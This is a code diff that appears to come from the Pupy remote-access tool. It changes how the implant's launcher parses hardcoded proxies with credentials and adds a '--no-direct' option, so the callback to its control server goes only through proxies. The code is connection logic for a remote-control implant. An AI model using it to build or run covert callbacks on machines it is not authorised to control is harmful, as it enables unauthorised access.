@@ -36,13 +36,17 @@ def get_proxies(wpad_timeout=600, additional_proxies=None):
     global last_wpad
 
     if additional_proxies != None:
-        login, password = None, None
-        if "@" in additional_proxies:
-            tab=additional_proxies.split(":", 1)
-            login, password=tab[0].split()
-            additional_proxies=tab[1]
-        tab=additional_proxies.split(":")
-        yield tab[0].upper(), tab[1]+":"+tab[2], login, password
+        for proxy_str in additional_proxies:
+            login, password = None, None
+            if "@" in proxy_str: # HTTP:login:password@ip:port
+                tab=proxy_str.split(":",1)
+                proxy_type=tab[0]
+                login, password=(tab[1].split("@")[0]).split(":",1)
+                address, port = tab[1].split("@")[1].split(":",1)
+            else:
+                #HTTP:ip:port
+                proxy_type, address, port = proxy_str.split(":")
+            yield proxy_type.upper(), address+":"+port, login, password
 
     if sys.platform=="win32":
         #TODO retrieve all users proxy settings, not only HKCU
@@ -147,6 +151,7 @@ class AutoProxyLauncher(BaseLauncher):
         self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to')
         self.arg_parser.add_argument('-t', '--transport', choices=[x for x in network.conf.transports.iterkeys()], default="ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
         self.arg_parser.add_argument('--add-proxy', action='append', help=" add a hardcoded proxy TYPE:address:port ex: SOCKS5:127.0.0.1:1080")
+        self.arg_parser.add_argument('--no-direct', action='store_true', help="do not attempt to connect without a proxy")
         self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex: param1=value param2=value ...")
 
     def parse_args(self, args):
@@ -167,38 +172,39 @@ class AutoProxyLauncher(BaseLauncher):
 
         opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
 
-        #first we try without any proxy :
-        try:
-            t=network.conf.transports[self.args.transport]()
-            client_args=copy.copy(t.client_kwargs)
-            transport_args=copy.copy(t.client_transport_kwargs)
-            for val in opt_args:
-                if val.lower() in t.client_kwargs:
-                    client_args[val.lower()]=opt_args[val]
-                elif val.lower() in t.client_transport_kwargs:
-                    transport_args[val.lower()]=opt_args[val]
-                else:
-                    logging.warning("unknown transport argument : %s"%val)
-            logging.info("using client options: %s"%client_args)
-            logging.info("using transports options: %s"%transport_args)
+        if not self.args.no_direct:
+            #first we try without any proxy :
             try:
-                t.parse_args(transport_args)
+                t=network.conf.transports[self.args.transport]()
+                client_args=copy.copy(t.client_kwargs)
+                transport_args=copy.copy(t.client_transport_kwargs)
+                for val in opt_args:
+                    if val.lower() in t.client_kwargs:
+                        client_args[val.lower()]=opt_args[val]
+                    elif val.lower() in t.client_transport_kwargs:
+                        transport_args[val.lower()]=opt_args[val]
+                    else:
+                        logging.warning("unknown transport argument : %s"%val)
+                logging.info("using client options: %s"%client_args)
+                logging.info("using transports options: %s"%transport_args)
+                try:
+                    t.parse_args(transport_args)
+                except Exception as e:
+                    #at this point we quit if we can't instanciate the client
+                    raise SystemExit(e)
+                try:
+                    client=t.client(**client_args)
+                except Exception as e:
+                    #at this point we quit if we can't instanciate the client
+                    raise SystemExit(e)
+                logging.info("connecting to %s:%s using transport %s without any proxy ..."%(self.rhost, self.rport, self.args.transport))
+                s=client.connect(self.rhost, self.rport)
+                stream = t.stream(s, t.client_transport, transport_args)
+                yield stream
+            except StopIteration:
+                raise
             except Exception as e:
-                #at this point we quit if we can't instanciate the client
-                raise SystemExit(e)
-            try:
-                client=t.client(**client_args)
-            except Exception as e:
-                #at this point we quit if we can't instanciate the client
-                raise SystemExit(e)
-            logging.info("connecting to %s:%s using transport %s without any proxy ..."%(self.rhost, self.rport, self.args.transport))
-            s=client.connect(self.rhost, self.rport)
-            stream = t.stream(s, t.client_transport, transport_args)
-            yield stream
-        except StopIteration:
-            raise
-        except Exception as e:
-            logging.error(e)
+                logging.error(e)
 
         #then with proxies
         for proxy_type, proxy, proxy_username, proxy_password in get_proxies(additional_proxies=self.args.add_proxy):
